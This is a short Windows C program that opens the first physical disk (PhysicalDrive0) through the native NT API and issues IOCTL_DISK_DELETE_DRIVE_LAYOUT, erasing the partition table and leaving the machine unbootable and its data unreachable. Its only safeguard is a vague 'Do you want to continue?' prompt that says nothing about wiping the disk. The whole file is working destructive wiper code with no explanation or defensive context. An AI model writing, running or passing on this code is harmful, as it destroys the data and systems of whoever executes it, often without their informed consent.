#pragma comment(lib, "ntdll.lib")

#include <windows.h>
#include <winternl.h>
#include <wchar.h>

void wmain()
{
    HANDLE diskHandle;
    UNICODE_STRING diskName;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK isb;

    wprintf(L"Do you want to continue? [Y/n]: ");

    if (_getwch() != L'Y')
        return;

    RtlInitUnicodeString(&diskName, L"\\??\\PhysicalDrive0");
    InitializeObjectAttributes(
        &objectAttributes,
        &diskName,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
        );

    if (NT_SUCCESS(NtCreateFile(
        &diskHandle,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE,
        &objectAttributes,
        &isb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
        )))
    {
        NtDeviceIoControlFile(
           diskHandle,
           NULL,
           NULL,
           NULL,
           &isb,
           IOCTL_DISK_DELETE_DRIVE_LAYOUT,
           NULL,
           0,
           NULL,
           0
           );

        NtClose(diskHandle);
    }
}
